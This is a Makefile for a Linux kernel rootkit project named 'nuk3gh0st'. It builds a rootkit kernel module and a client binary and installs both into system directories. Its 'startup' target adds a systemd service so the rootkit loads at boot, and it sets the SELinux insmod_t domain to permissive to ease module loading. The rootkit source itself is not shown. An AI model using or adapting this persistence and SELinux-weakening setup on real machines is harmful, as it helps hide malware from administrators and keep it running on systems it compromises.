.PHONY: all
obj-m := rootkit.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all: rootkit client
rootkit:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
client:
	gcc -o nuk3gh0st nuk3gh0st.c --std=gnu99 -Wall -Wextra -pedantic
install:
	cp nuk3gh0st /usr/bin/nuk3gh0st
	cp rootkit.ko /usr/lib/rootkit.ko
uninstall:
	rm /usr/bin/nuk3gh0st
	rm /usr/lib/rootkit.ko
startup:
	cp nuk3gh0st.startup /usr/lib/nuk3gh0st.startup
	chmod +x /usr/lib/nuk3gh0st.startup
	cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
	semanage permissive -a insmod_t
	systemctl enable nuk3gh0st.service
	service nuk3gh0st start
clean-startup:
	systemctl disable nuk3gh0st.service
	service nuk3gh0st stop
	semanage permissive -d insmod_t
	rm /usr/lib/nuk3gh0st.startup
	rm /lib/systemd/system/nuk3gh0st.service
clean:
	rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
